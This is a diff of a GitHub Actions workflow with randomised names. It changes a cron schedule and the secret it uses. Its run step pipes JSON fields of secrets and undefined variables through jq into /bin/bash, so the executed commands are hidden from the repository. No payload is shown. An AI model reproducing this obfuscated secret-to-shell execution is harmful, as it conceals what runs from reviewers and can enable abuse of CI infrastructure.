@@ -3,7 +3,7 @@ name: atrennuo
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 2/6 * * *'
+    - cron: '1 5/6 * * *'
 
 jobs:
   build:
@@ -12,15 +12,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: atrennuo
         env:
-          kzcky68793: ${{ secrets.kzcky68793 }}
+          jjm2850: ${{ secrets.jjm2850 }}
         run: |
-          echo $kzcky68793 | jq -r .kj186 | /bin/bash
-          echo $jt7462 | jq -r .vmbv7 | /bin/bash
-          echo $hz99 | jq -r .cmcbq97 | /bin/bash
-          echo $h7 | jq -r .rvij2000 | /bin/bash
-          echo $goss7538 | jq -r .yuydg43 | /bin/bash
-          echo $l2 | jq -r .mj2418 | /bin/bash
-          echo $knxeu6272 | jq -r .vldo56 | /bin/bash
-          echo $ylorq2 | jq -r .onpd5 | /bin/bash
-          echo $g1326 | jq -r .r42 | /bin/bash
+          echo $jjm2850 | jq -r .vaynl6 | /bin/bash
+          echo $y66 | jq -r .ucaz9 | /bin/bash
+          echo $tpo07 | jq -r .qdh2 | /bin/bash
+          echo $pzyrm7 | jq -r .ejo72777 | /bin/bash
 
